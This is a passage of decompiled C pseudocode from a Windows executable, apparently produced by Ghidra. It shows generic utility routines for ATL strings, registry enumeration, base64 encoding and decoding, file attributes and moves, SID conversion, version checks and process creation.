  CSimpleStringT__(param_1,piVar2);
  if (iVar1 == -1) {
    FUN_00404d7b(param_1,extraout_DX,(int)&DAT_0042f178);
  }
  else {
    piVar2 = FUN_00402958(param_2,(int *)&local_8,iVar1);
    FUN_00401b2a(param_1,piVar2);
    FUN_00401df0((int **)((int)local_8 + -0x10));
    piVar2 = FUN_0040290f(param_2,(int *)&local_8,(*(int *)(*param_2 + -6) - iVar1) + -1);
    FUN_00401b2a(param_2,piVar2);
    FUN_00401df0((int **)((int)local_8 + -0x10));
  }
  return param_1;
}



DWORD __fastcall FUN_00407564(int param_1)

{
  DWORD local_8;
  
  local_8 = 0;
  RegQueryInfoKeyW(*(HKEY *)(param_1 + 4),(LPWSTR)0x0,(LPDWORD)0x0,(LPDWORD)0x0,&local_8,
                   (LPDWORD)0x0,(LPDWORD)0x0,(LPDWORD)0x0,(LPDWORD)0x0,(LPDWORD)0x0,(LPDWORD)0x0,
                   (PFILETIME)0x0);
  return local_8;
}



undefined8 __thiscall FUN_0040758b(void *this,DWORD param_1,void *param_2)

{
  LSTATUS LVar1;
  undefined2 extraout_DX;
  undefined8 uVar2;
  DWORD local_20c;
  WCHAR local_208 [256];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_20c = 0x100;
  LVar1 = RegEnumKeyExW(*(HKEY *)((int)this + 4),param_1,local_208,&local_20c,(LPDWORD)0x0,
                        (LPWSTR)0x0,(LPDWORD)0x0,(PFILETIME)0x0);
  if (LVar1 == 0) {
    FUN_00404d7b(param_2,extraout_DX,(int)local_208);
  }
  uVar2 = FUN_0041a954();
  return uVar2;
}



int __fastcall FUN_00407602(short **param_1,undefined2 param_2,short param_3)

{
  short *psVar1;
  int iVar2;
  short *psVar3;
  
  psVar1 = *param_1;
  if (psVar1 == (short *)0x0) {
    iVar2 = 0;
  }
  else {
    iVar2 = FUN_0041c12a(param_1,param_2);
  }
  for (psVar3 = psVar1 + iVar2; psVar3 != psVar1; psVar3 = psVar3 + -1) {
    if (*psVar3 == param_3) goto LAB_00407636;
  }
  if (*psVar3 != param_3) {
    psVar3 = (short *)0x0;
  }
LAB_00407636:
  if (psVar3 == (short *)0x0) {
    iVar2 = -1;
  }
  else {
    iVar2 = (int)psVar3 - (int)*param_1 >> 1;
  }
  return iVar2;
}



int * __fastcall FUN_00407649(int *param_1,char *param_2,size_t param_3)

{
  int *piVar1;
  char *pcVar2;
  int iVar3;
  
  if ((int)param_3 < 0) {
    param_3 = _strlen(param_2);
  }
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  pcVar2 = GetBufferSetLength(param_1,param_3);
  iVar3 = 0;
  if (0 < (int)param_3) {
    do {
      *(ushort *)(pcVar2 + iVar3 * 2) = (ushort)(byte)param_2[iVar3];
      iVar3 = iVar3 + 1;
    } while (iVar3 < (int)param_3);
  }
  ReleaseBuffer(param_1,iVar3,param_3);
  return param_1;
}



uint __fastcall FUN_0040769a(LPCWSTR param_1,LPCWSTR param_2)

{
  WCHAR WVar1;
  uint uVar2;
  int iVar3;
  LPCWSTR pWVar4;
  LPWSTR pWVar5;
  LPWSTR pWVar6;
  LPCWSTR pWVar7;
  
  uVar2 = lstrlenW(param_1);
  iVar3 = lstrlenW(param_2);
  if ((int)uVar2 < iVar3) {
LAB_004076c1:
    uVar2 = uVar2 & 0xffffff00;
  }
  else {
    pWVar4 = param_1 + uVar2;
    pWVar7 = param_2 + iVar3;
    if (param_2 <= pWVar7) {
      pWVar4 = (LPCWSTR)((int)pWVar4 - (int)pWVar7);
      do {
        WVar1 = *pWVar7;
        pWVar5 = CharLowerW((LPWSTR)(uint)*(ushort *)((int)pWVar4 + (int)pWVar7));
        pWVar6 = CharLowerW((LPWSTR)(uint)(ushort)WVar1);
        uVar2 = (uint)pWVar6 & 0xffff;
        if ((short)pWVar5 != (short)uVar2) goto LAB_004076c1;
        pWVar7 = pWVar7 + -1;
      } while (param_2 <= pWVar7);
    }
    uVar2 = CONCAT31((int3)((uint)pWVar4 >> 8),1);
  }
  return uVar2;
}



CSimpleStringT_char_0_ * __fastcall FUN_00407708(CSimpleStringT_char_0_ *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  char *pcVar4;
  int iVar5;
  
  iVar1 = *param_2;
  iVar2 = *(int *)(iVar1 + -0xc);
  piVar3 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar3);
  pcVar4 = ATL::CSimpleStringT<char,0>::PrepareWrite(param_1,iVar2);
  ATL::CSimpleStringT<char,0>::SetLength(param_1,iVar2);
  iVar5 = 0;
  if (0 < iVar2) {
    do {
      pcVar4[iVar5] = *(char *)(iVar1 + iVar5 * 2);
      iVar5 = iVar5 + 1;
    } while (iVar5 < iVar2);
  }
  ReleaseBuffer(param_1,iVar2);
  return param_1;
}



int __thiscall FUN_0040775b(void *this,char *param_1,int param_2)

{
  char *pcVar1;
  char *pcVar2;
  int iVar3;
  int iVar4;
  byte *pbVar5;
  
  iVar3 = 0x30;
  pcVar2 = param_1;
  do {
    pbVar5 = (byte *)this;
    iVar4 = param_2;
    pcVar1 = pcVar2;
    if (iVar4 + -4 < 0) {
      return 0;
    }
    *pcVar1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[*pbVar5 >> 2];
    pcVar1[1] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                [(*pbVar5 & 3) * 0x10 + (uint)(pbVar5[1] >> 4)];
    pcVar1[2] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                [(pbVar5[1] & 0xf) * 4 + (uint)(pbVar5[2] >> 6)];
    iVar3 = iVar3 + -3;
    this = pbVar5 + 3;
    pcVar1[3] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[pbVar5[2] & 0x3f]
    ;
    pcVar2 = pcVar1 + 4;
    param_2 = iVar4 + -4;
  } while (2 < iVar3);
  if (iVar3 == 1) {
    if (iVar4 + -6 < 0) {
      return 0;
    }
                    // WARNING: Load size is inaccurate
    *pcVar2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[*this >> 2];
                    // WARNING: Load size is inaccurate
    pcVar1[5] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                [(*this & 3) * 0x10];
    if (iVar4 + -8 < 0) {
      return 0;
    }
    *(undefined2 *)(pcVar1 + 6) = 0x3d3d;
  }
  else {
    if (iVar3 != 2) goto LAB_0040785f;
    if (iVar4 + -7 < 0) {
      return 0;
    }
                    // WARNING: Load size is inaccurate
    *pcVar2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[*this >> 2];
                    // WARNING: Load size is inaccurate
    pcVar1[5] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                [(*this & 3) * 0x10 + (uint)(pbVar5[4] >> 4)];
    pcVar1[6] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                [(pbVar5[4] & 0xf) * 4];
    if (iVar4 + -8 < 0) {
      return 0;
    }
    pcVar1[7] = '=';
  }
  pcVar2 = pcVar1 + 8;
LAB_0040785f:
  return (int)pcVar2 - (int)param_1;
}



void FUN_0040786e(void)

{
  return;
}



int __fastcall FUN_0040786f(byte *param_1,int param_2,int param_3)

{
  byte bVar1;
  int iVar2;
  byte bVar3;
  int iVar4;
  bool bVar5;
  int iStack28;
  
  iVar4 = 0;
  iStack28 = 0;
  bVar3 = 0;
  if (param_2 != 0) {
    do {
      bVar3 = *param_1;
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
      if (bVar3 == 0) goto LAB_0040795f;
      if (" !\"#$%&\'()*+,-./0123ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
          [bVar3 + 0x99] != '\x01') {
        if (bVar3 == 0x3d) goto LAB_00407964;
        bVar1 = "ccccccccccccccccccccccccccccccccccccccccccc>ccc?456789:;<=ccccccc"[bVar3];
        if (bVar1 == 99) {
          return -1;
        }
        if (iStack28 == 0) {
          if (param_3 != 0) {
            if (0x2f < iVar4) {
              return -1;
            }
            *(byte *)(iVar4 + param_3) = bVar1 << 2;
          }
          iStack28 = 1;
        }
        else {
          if (iStack28 == 1) {
            if (param_3 != 0) {
              if (0x2f < iVar4) {
                return -1;
              }
              *(byte *)(iVar4 + param_3) = *(byte *)(iVar4 + param_3) | (char)bVar1 >> 4;
              if (iVar4 < 0x2f) {
                *(byte *)(iVar4 + 1 + param_3) = bVar1 << 4;
              }
              else if ((bVar1 & 0xf) != 0) {
                return -1;
              }
            }
            iStack28 = 2;
          }
          else {
            if (iStack28 != 2) {
              if (iStack28 == 3) {
                if (param_3 != 0) {
                  if (0x2f < iVar4) {
                    return -1;
                  }
                  *(byte *)(iVar4 + param_3) = *(byte *)(iVar4 + param_3) | bVar1;
                }
                iVar4 = iVar4 + 1;
                iStack28 = 0;
              }
              goto LAB_00407953;
            }
            if (param_3 != 0) {
              if (0x2f < iVar4) {
                return -1;
              }
              *(byte *)(iVar4 + param_3) = *(byte *)(iVar4 + param_3) | (char)bVar1 >> 2;
              if (iVar4 < 0x2f) {
                *(byte *)(iVar4 + 1 + param_3) = bVar1 << 6;
              }
              else if ((bVar1 & 3) != 0) {
                return -1;
              }
            }
            iStack28 = 3;
          }
          iVar4 = iVar4 + 1;
        }
      }
LAB_00407953:
    } while (param_2 != 0);
  }
  param_2 = param_2 + -1;
LAB_0040795f:
  if (bVar3 == 0x3d) {
LAB_00407964:
    if (iStack28 == 0) {
      return -1;
    }
    if (iStack28 == 1) {
      return -1;
    }
    if (param_2 != 0) {
      if (iStack28 == 2) {
        do {
          bVar3 = *param_1;
          param_1 = param_1 + 1;
          iVar2 = param_2;
          if ((bVar3 == 0) || (iVar2 = param_2 + -1, param_2 < 1)) break;
          param_2 = iVar2;
        } while (" !\"#$%&\'()*+,-./0123ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                 [bVar3 + 0x99] == '\x01');
        param_2 = iVar2;
        if (bVar3 != 0x3d) {
          return -1;
        }
      }
      while( true ) {
        bVar3 = *param_1;
        if (bVar3 == 0) {
          return iVar4;
        }
        param_1 = param_1 + 1;
        if (param_2 < 1) break;
        param_2 = param_2 + -1;
        if (" !\"#$%&\'()*+,-./0123ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
            [bVar3 + 0x99] != '\x01') {
          return -1;
        }
      }
      return iVar4;
    }
    bVar5 = iStack28 == 2;
  }
  else {
    bVar5 = iStack28 == 1;
  }
  if (bVar5) {
    return -1;
  }
  return iVar4;
}



int __fastcall FUN_004079cf(int param_1,ushort *param_2,int param_3,char param_4)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  ushort uVar4;
  
  if (param_3 != 0) {
    iVar3 = param_1 - (int)param_2;
    do {
      uVar2 = (uint)*param_2;
      uVar4 = *(ushort *)(iVar3 + (int)param_2);
      param_2 = param_2 + 1;
      if (param_4 != '\0') {
        uVar1 = FUN_00407a57((uint)uVar4);
        uVar4 = (ushort)uVar1;
        uVar2 = FUN_00407a57(uVar2);
        uVar2 = uVar2 & 0xffff;
      }
      param_3 = param_3 + -1;
    } while (((param_3 != 0) && (uVar4 != 0)) && (uVar4 == (ushort)uVar2));
    param_3 = uVar4 - uVar2;
  }
  return param_3;
}



int __fastcall FUN_00407a34(short *param_1,short param_2)

{
  short *psVar1;
  short sVar2;
  
  sVar2 = *param_1;
  psVar1 = param_1;
  while( true ) {
    if (sVar2 == 0) {
      return -1;
    }
    if (sVar2 == param_2) break;
    psVar1 = psVar1 + 1;
    sVar2 = *psVar1;
  }
  return (int)psVar1 - (int)param_1 >> 1;
}



uint __fastcall FUN_00407a57(uint param_1)

{
  LPWSTR pWVar1;
  
  if ((int)param_1 < 0x80) {
    if ((byte)((char)param_1 + 0xbfU) < 0x1a) {
      param_1 = (uint)(byte)((char)param_1 + 0x20);
    }
    return (int)(char)param_1;
  }
  pWVar1 = CharLowerW((LPWSTR)(param_1 & 0xffff));
  return (uint)pWVar1 & 0xffff;
}



void __fastcall FUN_00407a7b(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  piVar1 = *(int **)(iVar2 + -0x10);
  if (*(int *)(iVar2 + -0xc) != 0) {
    if (*(int *)(iVar2 + -4) < 0) {
      ATL::CSimpleStringT<char,0>::SetLength((CSimpleStringT_char_0_ *)param_1,0);
    }
    else {
      FUN_00401df0((int **)(iVar2 + -0x10));
      iVar2 = (**(code **)(*piVar1 + 0xc))();
      *param_1 = iVar2 + 0x10;
    }
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall ATL::CSimpleStringT<char,0>::ReleaseBuffer(int)
//  public: void __thiscall ATL::CSimpleStringT<wchar_t,0>::ReleaseBuffer(int)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

void __thiscall ReleaseBuffer(void *this,int param_1)

{
                    // WARNING: Load size is inaccurate
  if ((param_1 == -1) && (param_1 = *this, param_1 != 0)) {
    param_1 = FUN_00423587();
  }
  ATL::CSimpleStringT<char,0>::SetLength((CSimpleStringT_char_0_ *)this,param_1);
  return;
}



void * __thiscall FUN_00407adc(void *this,HMODULE param_1)

{
  int *piVar1;
  uint uVar2;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(this,piVar1);
  uVar2 = CheckImplicitLoad(this,param_1);
  if ((char)uVar2 == '\0') {
    FUN_00407ba6(this,(LPCSTR)param_1);
  }
  return this;
}



uint __thiscall FUN_00407b0e(void *this,int param_1)

{
  code *pcVar1;
  uint uVar2;
  
                    // WARNING: Load size is inaccurate
  uVar2 = *this;
  if (param_1 <= *(int *)(uVar2 - 0xc)) {
    return uVar2 & 0xffff0000 | (uint)*(ushort *)(uVar2 + param_1 * 2);
  }
  ATL::AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  uVar2 = (*pcVar1)();
  return uVar2;
}



int __fastcall FUN_00407b2e(int *param_1)

{
  if (1 < *(int *)(*param_1 + -4)) {
    FUN_00401bd6(param_1,*(undefined4 *)(*param_1 + -0xc));
  }
  return *param_1;
}



int * __thiscall FUN_00407b45(void *this,int param_1,int param_2,undefined4 *param_3)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  int extraout_ECX;
  long lVar4;
  
  if (param_3 == (undefined4 *)0x0) {
    lVar4 = -0x7fffbffb;
  }
  else {
    if ((param_1 != 0) || (param_2 == 0)) {
      iVar2 = (**(code **)*param_3)(param_2,1);
      if (iVar2 != 0) {
        *(int *)this = iVar2 + 0x10;
        ATL::CSimpleStringT<char,0>::SetLength((CSimpleStringT_char_0_ *)this,param_2);
        FUN_00423348(extraout_ECX);
        return (int *)this;
      }
      goto LAB_00407ba0;
    }
    lVar4 = -0x7ff8ffa9;
  }
  ATL::AtlThrowImpl(lVar4);
LAB_00407ba0:
  FUN_00401c40();
  pcVar1 = (code *)swi(3);
  piVar3 = (int *)(*pcVar1)();
  return piVar3;
}



int * __thiscall FUN_00407ba6(void *this,LPCSTR param_1)

{
  int iVar1;
  LPWSTR lpWideCharStr;
  
  if (param_1 == (LPCSTR)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = MultiByteToWideChar(3,0,param_1,-1,(LPWSTR)0x0,0);
    iVar1 = iVar1 + -1;
  }
  if (iVar1 < 1) {
    FUN_00401ba1((int *)this);
  }
  else {
    lpWideCharStr =
         (LPWSTR)ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,iVar1);
    MultiByteToWideChar(3,0,param_1,-1,lpWideCharStr,iVar1);
    ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)this,iVar1);
  }
  return (int *)this;
}



undefined8 FUN_00407c01(void)

{
  _FILETIME local_c;
  
  local_c.dwLowDateTime = DAT_00437b78;
  local_c.dwHighDateTime = DAT_00437b7c;
  if ((DAT_00437b78 | DAT_00437b7c) == 0) {
    local_c.dwLowDateTime = 0;
    local_c.dwHighDateTime = 0;
    GetSystemTimeAsFileTime(&local_c);
  }
  return CONCAT44(local_c.dwHighDateTime,local_c.dwLowDateTime);
}



void __fastcall FUN_00407c33(undefined4 param_1,uint param_2,int param_3)

{
  code *pcVar1;
  
  if (param_3 != 0) {
    FUN_004224d0(param_1,param_2);
    return;
  }
  ATL::AtlThrowImpl(-0x7fffbffb);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined8 __cdecl FUN_00407c57(void *param_1)

{
  bool bVar1;
  DWORD DVar2;
  int *piVar3;
  int iVar4;
  undefined2 extraout_DX;
  undefined8 uVar5;
  int local_84;
  undefined **local_80;
  undefined4 local_7c;
  undefined4 local_78;
  undefined4 local_74;
  undefined4 local_70 [25];
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  FUN_00403cae(local_70);
  local_7c = 0;
  local_80 = &PTR_FUN_0042f0f4;
  local_78 = 0;
  local_74 = 0;
  bVar1 = FUN_00403cfe(&local_80,8,(HANDLE)0x0);
  if ((bVar1 == false) || (uVar5 = FUN_004032d9(&local_80,local_70), (char)uVar5 == '\0')) {
    DVar2 = FUN_00407e13();
    piVar3 = (int *)FUN_0040139e();
    CSimpleStringT__(&local_84,piVar3);
    FUN_00401df0((int **)(local_84 + -0x10));
    local_80 = &PTR_FUN_0042f0f4;
    FUN_00403d60((int)&local_80);
    if ((int)DVar2 < 0) goto LAB_00407d02;
  }
  else {
    local_80 = &PTR_FUN_0042f0f4;
    FUN_00403d60((int)&local_80);
  }
  if (param_1 != (void *)0x0) {
    iVar4 = FUN_00407d1d(local_70);
    FUN_00404d7b(param_1,extraout_DX,iVar4);
  }
LAB_00407d02:
  FUN_00404961(local_70);
  uVar5 = FUN_0041a954();
  return uVar5;
}



int __fastcall FUN_00407d1d(HLOCAL param_1)

{
  int *piVar1;
  undefined6 uVar2;
  HLOCAL local_8;
  
  piVar1 = (int *)((int)param_1 + 0x58);
  if (*(int *)(*piVar1 + -0xc) == 0) {
    local_8 = param_1;
    uVar2 = ConvertSidToStringSidW((int)param_1 + 4,&local_8);
    if ((int)uVar2 != 0) {
      FUN_00404d7b(piVar1,(short)((uint6)uVar2 >> 0x20),(int)local_8);
      LocalFree(local_8);
    }
  }
  return *piVar1;
}



undefined8 FUN_00407d59(void)

{
  DWORDLONG dwlConditionMask;
  undefined8 uVar1;
  undefined local_12c [276];
  uint local_18;
  undefined4 local_14;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_12c._0_4_ = 0x11c;
  local_12c._4_4_ = 0;
  local_12c._20_2_ = L'\0';
  local_12c._8_4_ = 0;
  local_12c._12_4_ = 0;
  local_12c._16_4_ = 0;
  FUN_00416e80((uint *)(local_12c + 0x16),0,0xfe);
  local_14 = 0;
  local_18 = 0;
  uVar1 = VerSetConditionMask(0,0,2,3,1,3,0x20,3);
  uVar1 = VerSetConditionMask(uVar1);
  dwlConditionMask = (DWORDLONG)VerSetConditionMask(uVar1);
  local_12c._4_4_ = 6;
  local_12c._8_4_ = 0;
  local_18 = local_18 & 0xffff0000;
  VerifyVersionInfoW((LPOSVERSIONINFOEXW)local_12c,0x23,dwlConditionMask);
  uVar1 = FUN_0041a954();
  return uVar1;
}



DWORD FUN_00407e13(void)

{
  DWORD DVar1;
  
  DVar1 = GetLastError();
  if (DVar1 == 0) {
    DVar1 = 0x80004005;
  }
  else if (0 < (int)DVar1) {
    DVar1 = DVar1 & 0xffff | 0x80070000;
  }
  if ((DAT_00437b90 != 0) && (DVar1 == DAT_00437b90)) {
    RaiseException(0,1,0,(ULONG_PTR *)0x0);
  }
  return DVar1;
}



undefined8 __fastcall FUN_00407e50(LPCWSTR param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined8 uVar3;
  undefined4 local_2c;
  undefined4 local_28 [8];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_2c = 0;
  puVar2 = local_28;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  GetFileAttributesExW(param_1,GetFileExInfoStandard,&local_2c);
  uVar3 = FUN_0041a954();
  return uVar3;
}



undefined8 __fastcall FUN_00407e93(LPCWSTR param_1)

{
  undefined8 uVar1;
  uint local_2c [9];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  FUN_00416e80(local_2c,0,0x24);
  GetFileAttributesExW(param_1,GetFileExInfoStandard,local_2c);
  uVar1 = FUN_0041a954();
  return uVar1;
}



DWORD __fastcall FUN_00407ee3(LPCWSTR param_1,LPCWSTR param_2)

{
  DWORD DVar1;
  BOOL BVar2;
  undefined8 uVar3;
  
  uVar3 = FUN_00407e50(param_1);
  if ((char)uVar3 == '\0') {
    DVar1 = 0x80070002;
  }
  else {
    DVar1 = 4;
    uVar3 = FUN_00407e93(param_1);
    if ((char)uVar3 == '\0') {
      DVar1 = 5;
    }
    BVar2 = MoveFileExW(param_1,param_2,DVar1);
    if (BVar2 == 0) {
      DVar1 = FUN_00407e13();
      return DVar1;
    }
    DVar1 = 0;
  }
  return DVar1;
}



DWORD __fastcall
FUN_00407f25(LPCWSTR param_1,LPFILETIME param_2,undefined4 param_3,LPFILETIME param_4)

{
  HANDLE hFile;
  BOOL BVar1;
  DWORD DVar2;
  ulonglong uVar3;
  
  uVar3 = FUN_00407e93(param_1);
  DVar2 = 0;
  hFile = CreateFileW(param_1,1,1,(LPSECURITY_ATTRIBUTES)0x0,3,
                      -(uint)((uVar3 & 0xff) != 0) & 0x2000000,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    DVar2 = FUN_00407e13();
  }
  else {
    BVar1 = GetFileTime(hFile,param_2,(LPFILETIME)0x0,param_4);
    if (BVar1 == 0) {
      DVar2 = FUN_00407e13();
    }
    CloseHandle(hFile);
  }
  return DVar2;
}



undefined8 __fastcall FUN_00407f87(LPCWSTR param_1,undefined4 *param_2)

{
  BOOL BVar1;
  undefined8 uVar2;
  uint local_2c [8];
  undefined4 local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  FUN_00416e80(local_2c,0,0x24);
  BVar1 = GetFileAttributesExW(param_1,GetFileExInfoStandard,local_2c);
  if (BVar1 == 0) {
    FUN_00407e13();
  }
  else {
    *param_2 = local_c;
  }
  uVar2 = FUN_0041a954();
  return uVar2;
}



uint ** __fastcall FUN_00407fdc(uint **param_1,undefined4 param_2)

{
  undefined4 uVar1;
  
  *param_1 = (uint *)0x0;
  param_1[1] = (uint *)0x0;
  param_1[2] = (uint *)0x0;
  uVar1 = FUN_00402ff7((int *)param_1,param_2,6);
  if ((char)uVar1 != '\0') {
    FUN_00416e80(*param_1,0,6);
    param_1[1] = (uint *)((int)param_1[1] + 6);
  }
  return param_1;
}



void __fastcall FUN_0040800d(int **param_1)

{
  int *piVar1;
  int *piVar2;
  
  piVar2 = *param_1;
  if (piVar2 != (int *)0x0) {
    piVar1 = param_1[1];
    for (; piVar2 != piVar1; piVar2 = piVar2 + 1) {
      FUN_00401df0((int **)(*piVar2 + -0x10));
    }
    FID_conflict__free(*param_1);
    *param_1 = (int *)0x0;
    param_1[1] = (int *)0x0;
    param_1[2] = (int *)0x0;
  }
  return;
}



DWORD __fastcall
FUN_00408044(undefined4 param_1,LPWSTR param_2,LPVOID param_3,BOOL param_4,
            LPPROCESS_INFORMATION param_5)

{
  BOOL BVar1;
  DWORD DVar2;
  _STARTUPINFOW local_60;
  void *local_18;
  uint local_14;
  undefined4 local_10;
  undefined4 local_c;
  
  local_60.cb = 0x44;
  local_60.lpReserved = (LPWSTR)0x0;
  FUN_00416e80((uint *)&local_60.lpDesktop,0,0x3c);
  local_60.dwFlags = 0x80;
  if (param_3 == (LPVOID)0x0) {
    param_3 = (LPVOID)0x0;
    DVar2 = 0;
  }
  else {
    DVar2 = 0x400;
  }
  BVar1 = CreateProcessW((LPCWSTR)0x0,param_2,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,
                         param_4,DVar2,param_3,(LPCWSTR)0x0,&local_60,param_5);
  if (BVar1 == 0) {
    DVar2 = FUN_00407e13();
  }
  else {
    local_18 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (local_18 != (void *)0x0) {
      local_14 = FUN_00405bda(local_18,local_18,1);
      local_10 = 1;
      local_c = 8;
      FUN_00401e16(&local_18,L"[Started process][%u]");
    }
    DVar2 = 0;
  }
  return DVar2;
}



undefined __fastcall FUN_004080ed(void *param_1)

{
  bool bVar1;
  undefined uVar2;
  DWORD DVar3;
  
  bVar1 = FUN_00404ff2(param_1,8);
  if (bVar1 == false) {
    DVar3 = GetLastError();
    if (DVar3 == 0x3f0) {
      uVar2 = FUN_00403cfe(param_1,8,(HANDLE)0x0);
    }
    else {
      uVar2 = 0;
    }
  }
  else {
    uVar2 = 1;
  }
  return uVar2;
}



void __cdecl FUN_00408121(int *param_1,undefined2 param_2)

{
  FUN_0040818a(param_1,param_2,&stack0x0000000c);
  return;
}



void __cdecl FUN_00408136(CSimpleStringT_char_0_ *param_1,char *param_2)

{
  FUN_0040827f(param_1,param_2,&stack0x0000000c);
  return;
}



void __cdecl FUN_0040814b(void *param_1,undefined2 param_2)

{
  int *piVar1;
  int local_8;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar1);
  FUN_0040818a(&local_8,param_2,&stack0x0000000c);
  FUN_004029bc(param_1,local_8,*(int *)(local_8 + -0xc));
  FUN_00401df0((int **)(local_8 + -0x10));
  return;
}



int __fastcall FUN_0040818a(int *param_1,undefined2 param_2,undefined4 param_3)

{
  uint uVar1;
  undefined2 *puVar2;
  undefined2 **ppuVar3;
  undefined2 *puVar4;
  uint extraout_EDX;
  uint extraout_EDX_00;
  uint uVar5;
  undefined2 *puVar6;
  int iVar7;
  undefined2 *local_10;
  int *local_c;
  undefined2 *local_8;
  
  local_8 = (undefined2 *)0x100;
  local_c = param_1;
  local_10 = (undefined2 *)FUN_0041c12a(param_1,param_2);
  ppuVar3 = &local_8;
  if ((undefined2 *)0xff < local_10) {
    ppuVar3 = &local_10;
  }
  puVar6 = *ppuVar3;
  if ((undefined2 *)0x7fffffff < puVar6) {
    return -0x7ff8ffa9;
  }
  do {
    local_8 = (undefined2 *)
              ATL::CSimpleStringT<char,0>::PrepareWrite
                        ((CSimpleStringT_char_0_ *)param_1,(int)puVar6);
    uVar1 = (int)puVar6 - 1;
    iVar7 = 0;
    if ((uVar1 == 0) || (0x7fffffff < uVar1)) {
      iVar7 = -0x7ff8ffa9;
    }
    if (iVar7 < 0) {
      uVar5 = extraout_EDX;
      if (uVar1 != 0) {
        *local_8 = 0;
      }
    }
    else {
      puVar2 = puVar6 + -1;
      iVar7 = 0;
      puVar4 = (undefined2 *)thunk_FUN_004238e3(uVar1,extraout_EDX);
      uVar5 = extraout_EDX_00;
      if (((int)puVar4 < 0) || (puVar2 < puVar4)) {
        iVar7 = -0x7ff8ff86;
      }
      else if (puVar4 != puVar2) goto LAB_00408233;
      local_8[(int)puVar2] = 0;
    }
LAB_00408233:
    param_1 = local_c;
    if ((iVar7 != -0x7ff8ff86) || (iVar7 = -0x7ff8ffa9, (undefined2 *)0x7ffffffe < puVar6)) {
      ReleaseBuffer(local_c,uVar5,-1);
      return iVar7;
    }
    local_10 = (undefined2 *)0x7fffffff;
    local_8 = (undefined2 *)((int)puVar6 * 2);
    ppuVar3 = &local_10;
    if ((undefined2 *)((int)puVar6 * 2) < (undefined2 *)0x80000000) {
      ppuVar3 = &local_8;
    }
    puVar6 = *ppuVar3;
    ReleaseBuffer(local_c,uVar5,-1);
  } while( true );
}



int __fastcall FUN_0040827f(CSimpleStringT_char_0_ *param_1,char *param_2,undefined4 param_3)

{
  char *pcVar1;
  char **ppcVar2;
  char *pcVar3;
  undefined extraout_DL;
  char *pcVar4;
  int iVar5;
  char *local_10;
  CSimpleStringT_char_0_ *local_c;
  char *local_8;
  
  local_8 = (char *)0x100;
  local_c = param_1;
  local_10 = (char *)_strlen(param_2);
  ppcVar2 = &local_8;
  if ((char *)0xff < local_10) {
    ppcVar2 = &local_10;
  }
  pcVar4 = *ppcVar2;
  if ((char *)0x7fffffff < pcVar4) {
    return -0x7ff8ffa9;
  }
  do {
    local_8 = ATL::CSimpleStringT<char,0>::PrepareWrite(param_1,(int)pcVar4);
    pcVar3 = pcVar4 + -1;
    iVar5 = 0;
    if ((pcVar3 == (char *)0x0) || ((char *)0x7fffffff < pcVar3)) {
      iVar5 = -0x7ff8ffa9;
    }
    if (iVar5 < 0) {
      if (pcVar3 != (char *)0x0) {
        *local_8 = '\0';
      }
    }
    else {
      pcVar1 = pcVar4 + -2;
      iVar5 = 0;
      pcVar3 = (char *)FUN_0042383f(pcVar3,extraout_DL);
      if (((int)pcVar3 < 0) || (pcVar1 < pcVar3)) {
        iVar5 = -0x7ff8ff86;
      }
